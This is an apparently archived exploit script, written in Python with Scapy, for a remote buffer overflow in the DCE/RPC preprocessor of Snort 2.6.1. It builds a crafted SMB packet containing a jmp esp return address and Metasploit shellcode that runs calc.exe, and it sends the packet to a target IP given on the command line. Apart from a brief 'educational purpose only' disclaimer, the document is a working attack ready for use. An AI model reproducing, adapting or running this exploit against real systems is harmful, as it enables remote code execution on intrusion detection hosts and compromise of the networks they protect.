<html><head><title>Snort 2.6.1 DCE/RPC Preprocessor Remote Buffer Overflow Exploit</title></head><pre>#!/usr/bin/python
#
# Snort DCE/RPC Preprocessor Buffer Overflow (Command Execution Version)
# 
# Author: Trirat Puttaraksa &lt;trir00t [at] gmail.com&gt;
#
# http://sf-freedom.blogspot.com
#
######################################################
# For educational purpose only
#
# This exploit call calc.exe on Windows XP SP2 + Snort 2.6.1
#
# Note: this exploit use Scapy (http://www.secdev.org/projects/scapy/) 
# to inject the packet, so you have to install Scapy before use it.
#
#######################################################

import sys
from scapy import *
from struct import pack
conf.verb = 0

# NetBIOS Session Service
payload = &quot;\x00\x00\x02\xab&quot;

# SMB Header
payload += &quot;\xff\x53\x4d\x42\x75\x00\x00\x00\x00\x18\x07\xc8\x00\x00&quot;
payload += &quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xfe&quot;
payload += &quot;\x00\x08\x30\x00&quot;

# Tree Connect AndX Request
payload += &quot;\x04\xa2\x00\x52\x00\x08\x00\x01\x00\x27\x00\x00&quot;
payload += &quot;\x5c\x00\x5c\x00\x49\x00\x4e\x00\x53\x00\x2d\x00\x4b\x00\x49\x00&quot;
payload += &quot;\x52\x00\x41\x00\x5c\x00\x49\x00\x50\x00\x43\x00\x24\x00\x00\x00&quot;
payload += &quot;\x3f\x3f\x3f\x3f\x3f\x00&quot;

# NT Create AndX Request
payload += &quot;\x18\x2f\x00\x96\x00\x00\x0e\x00\x16\x00\x00\x00\x00\x00\x00\x00&quot;
payload += &quot;\x9f\x01\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;
payload += &quot;\x03\x00\x00\x00\x01\x00\x00\x00\x40\x00\x40\x00\x02\x00\x00\x00&quot;
payload += &quot;\x01\x11\x00\x00\x5c\x00\x73\x00\x72\x00\x76\x00\x73\x00\x76\x00&quot;
payload += &quot;\x63\x00\x00\x00&quot;

# Write AndX Request #1
payload += &quot;\x0e\x2f\x00\xfe\x00\x00\x40\x00\x00\x00\x00\xff\xff\xff\xff\x80&quot;
payload += &quot;\x00\x48\x00\x00\x00\x48\x00\xb6\x00\x00\x00\x00\x00\x49\x00\xee&quot;

#payload += &quot;\x05\x00\x0b\x03\x10\x00\x00\x00\xff\x01\x00\x00\x01\x00\x00\x00&quot;
payload += &quot;\x05\x00\x0b\x03\x10\x00\x00\x00\x10\x02\x00\x00\x01\x00\x00\x00&quot;
payload += &quot;\xb8\x10\xb8\x10\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x01\x00&quot;
payload += &quot;\xc8\x4f\x32\x4b\x70\x16\xd3\x01\x12\x78\x5a\x47\xbf\x6e\xe1\x88&quot;
payload += &quot;\x03\x00\x00\x00\x04\x5d\x88\x8a\xeb\x1c\xc9\x11\x9f\xe8\x08\x00&quot;
payload += &quot;\x2b\x10\x48\x60\x02\x00\x00\x00&quot;

# Write AndX Request #2
payload += &quot;\x0e\xff\x00\xde\xde\x00\x40\x00\x00\x00\x00\xff\xff\xff\xff\x80&quot;
payload += &quot;\x00\x48\x00\x00\x00\xff\x01\xce\x01\x00\x00\x00\x00\x49\x00\xee&quot;

# 0x7c941eed -&gt; jmp esp; make stack happy; windows/exec calc.exe (metasploit.com)
payload += &quot;\xed\x1e\x94\x7c\x90\x81\xc4\xff\xef\xff\xff\x44&quot;

payload += &quot;\x31\xc9\x83\xe9\xdd\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xa9&quot;
payload += &quot;\xd1\x80\xf5\x83\xeb\xfc\xe2\xf4\x55\x39\xc4\xf5\xa9\xd1\x0b\xb0&quot;
payload += &quot;\x95\x5a\xfc\xf0\xd1\xd0\x6f\x7e\xe6\xc9\x0b\xaa\x89\xd0\x6b\xbc&quot;
payload += &quot;\x22\xe5\x0b\xf4\x47\xe0\x40\x6c\x05\x55\x40\x81\xae\x10\x4a\xf8&quot;
payload += &quot;\xa8\x13\x6b\x01\x92\x85\xa4\xf1\xdc\x34\x0b\xaa\x8d\xd0\x6b\x93&quot;
payload += &quot;\x22\xdd\xcb\x7e\xf6\xcd\x81\x1e\x22\xcd\x0b\xf4\x42\x58\xdc\xd1&quot;
payload += &quot;\xad\x12\xb1\x35\xcd\x5a\xc0\xc5\x2c\x11\xf8\xf9\x22\x91\x8c\x7e&quot;
payload += &quot;\xd9\xcd\x2d\x7e\xc1\xd9\x6b\xfc\x22\x51\x30\xf5\xa9\xd1\x0b\x9d&quot;
payload += &quot;\x95\x8e\xb1\x03\xc9\x87\x09\x0d\x2a\x11\xfb\xa5\xc1\xaf\x58\x17&quot;
payload += &quot;\xda\xb9\x18\x0b\x23\xdf\xd7\x0a\x4e\xb2\xe1\x99\xca\xff\xe5\x8d&quot;
payload += &quot;\xcc\xd1\x80\xf5&quot;

payload += &quot;\x90&quot;  # padding

if len(sys.argv) != 2:
	print &quot;Usage snort_execute_dcerpc.py &lt;fake destination ip&gt;&quot;
	sys.exit(1)

target = sys.argv[1]

p = IP(dst=target) / TCP(sport=1025, dport=139, flags=&quot;PA&quot;) / payload
send(p)

# milw0rm.com [2007-03-01]</pre></html>